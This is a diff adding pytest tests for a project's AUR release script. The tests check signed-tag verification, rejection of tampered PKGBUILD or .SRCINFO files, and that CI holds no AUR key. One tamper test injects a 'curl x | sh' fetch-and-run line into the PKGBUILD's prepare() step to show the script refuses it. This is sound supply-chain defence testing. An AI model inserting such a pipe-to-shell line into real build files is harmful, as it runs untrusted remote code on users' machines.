@@ -6,6 +6,7 @@ These tests sign tags with a throw-away key shaped like the real one -- a [C]
 primary and [S] subkeys -- and check what passes and what does not.
 """
 
+import re
 import shutil
 import subprocess
 from pathlib import Path
@@ -135,3 +136,120 @@ def test_a_lightweight_tag_is_refused(signing):
     result = verify("v1.0.0")
     assert result.returncode == 1
     assert "annotato" in result.stderr
+
+
+# -- scripts/aur-release.sh ---------------------------------------------------- #
+
+AUR_RELEASE = ROOT / "scripts" / "aur-release.sh"
+
+
+def _srcinfo(pkgbuild: str) -> str:
+    """The lines of .SRCINFO that aur-release.sh checks, as makepkg writes them."""
+    values = {}
+    for name in ("pkgver", "url"):
+        line = next(line for line in pkgbuild.splitlines() if line.startswith(f"{name}="))
+        values[name] = line.split("=", 1)[1].strip('"')
+    sums = pkgbuild.split("sha256sums=(", 1)[1].split(")", 1)[0].replace("'", "").split()
+    primary = pkgbuild.split("validpgpkeys=('", 1)[1].split("'", 1)[0]
+    sources = [f"plico::git+{values['url']}.git#tag=v{values['pkgver']}?signed"]
+    sources += [f"https://example.org/wheel{i}.whl" for i in range(len(sums) - 1)]
+    lines = ["pkgbase = plico", f"\tpkgver = {values['pkgver']}"]
+    lines += [f"\tsource = {source}" for source in sources]
+    lines += [f"\tvalidpgpkeys = {primary}"]
+    lines += [f"\tsha256sums = {value}" for value in sums]
+    return "\n".join(lines + ["", "pkgname = plico", ""])
+
+
+@pytest.fixture
+def aur(signing, tmp_path):
+    """A repository with the real AUR scripts, an artifact, and an empty AUR."""
+    tag, _verify, keys = signing
+    repo = tmp_path / "repo"
+    for part in ("scripts/prepare-aur.sh", "scripts/release-keys.sh",
+                 "packaging/arch/PKGBUILD.in", "src/plico/__init__.py"):
+        (repo / part).parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(ROOT / part, repo / part)
+    env = {"GNUPGHOME": str(tmp_path / "g"), "PATH": "/usr/bin:/bin", "HOME": str(tmp_path)}
+    _run(["git", "-C", str(repo), "add", "."], env=env)
+    _run(["git", "-C", str(repo), "commit", "-q", "-m", "scripts"], env=env)
+    version = re.search(r'^__version__ = "(.*)"$', (repo / "src/plico/__init__.py").read_text(),
+                        re.MULTILINE)[1]
+    public = tmp_path / "release.asc"
+    primary = _run(["gpg", "--with-colons", "--show-keys", str(public)]).split("fpr:::::::::")[1]
+    primary = primary.split(":", 1)[0]
+    script_env = {
+        "PATH": "/usr/bin:/bin", "HOME": str(tmp_path),
+        "PLICO_REPO": str(repo), "PLICO_RELEASE_KEY": str(public),
+        "PLICO_RELEASE_PRIMARY": primary, "PLICO_TAG_SIGNING_SUBKEYS": keys["tag"],
+        "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1",
+    }
+    artifact = tmp_path / "artifact"
+    subprocess.run([str(repo / "scripts/prepare-aur.sh"), str(artifact)], check=True,
+                   capture_output=True, env={**script_env, "PLICO_VERSION": version})
+    (artifact / ".SRCINFO").write_text(_srcinfo((artifact / "PKGBUILD").read_text()))
+    remote = tmp_path / "plico.git"
+    subprocess.run(["git", "init", "-q", "--bare", "-b", "master", str(remote)], check=True)
+
+    def publish() -> subprocess.CompletedProcess:
+        return subprocess.run(
+            [str(AUR_RELEASE), f"v{version}"], capture_output=True, text=True, check=False,
+            env={**script_env, "PLICO_ARCH_ARTIFACT": str(artifact),
+                 "AUR_REMOTE": f"file://{remote}", "AUR_SKIP_SOURCE_CHECK": "1"},
+        )
+
+    def published() -> list[str]:
+        out = subprocess.run(["git", "--git-dir", str(remote), "ls-tree", "--name-only",
+                              "master"], capture_output=True, text=True, check=False)
+        return out.stdout.split()
+
+    return {"tag": lambda key: tag(f"v{version}", keys[key]), "publish": publish,
+            "published": published, "artifact": artifact, "remote": remote}
+
+
+def test_aur_release_publishes_the_pkgbuild_the_ci_built(aur):
+    aur["tag"]("tag")
+    result = aur["publish"]()
+    assert result.returncode == 0, result.stderr
+    assert aur["published"]() == [".SRCINFO", "PKGBUILD"]
+    pushed = _run(["git", "--git-dir", str(aur["remote"]), "show", "master:PKGBUILD"])
+    assert pushed == (aur["artifact"] / "PKGBUILD").read_text()
+
+
+def test_aur_release_refuses_a_tag_another_subkey_signed(aur):
+    aur["tag"]("other")
+    assert aur["publish"]().returncode != 0
+    assert aur["published"]() == []
+
+
+def test_aur_release_refuses_a_pkgbuild_the_tag_does_not_produce(aur):
+    """Whoever controls the CI cannot choose what goes to AUR."""
+    aur["tag"]("tag")
+    pkgbuild = aur["artifact"] / "PKGBUILD"
+    pkgbuild.write_text(pkgbuild.read_text().replace("prepare() {", "prepare() {\n  curl x | sh"))
+    result = aur["publish"]()
+    assert result.returncode != 0
+    assert "diverso" in result.stderr
+    assert aur["published"]() == []
+
+
+def test_aur_release_refuses_a_srcinfo_that_tells_another_story(aur):
+    aur["tag"]("tag")
+    srcinfo = aur["artifact"] / ".SRCINFO"
+    srcinfo.write_text(srcinfo.read_text().replace(
+        "\tvalidpgpkeys", "\tsource = https://example.org/extra.tar.gz\n\tvalidpgpkeys"))
+    result = aur["publish"]()
+    assert result.returncode != 0
+    assert aur["published"]() == []
+
+
+def test_the_ci_holds_no_aur_key():
+    """The AUR key is valid for every package of the account: it stays local."""
+    for workflow in (ROOT / ".github" / "workflows").glob("*.yml"):
+        text = workflow.read_text()
+        jobs = "\n".join(
+            line for line in text.split("\njobs:", 1)[-1].splitlines()
+            if not line.lstrip().startswith("#")
+        )
+        assert "AUR_SSH_PRIVATE_KEY" not in text, workflow.name
+        assert "publish-aur" not in jobs and "aur-release" not in jobs, workflow.name
+    assert "AUR_SSH_PRIVATE_KEY" not in (ROOT / "scripts" / "publish-aur.sh").read_text()
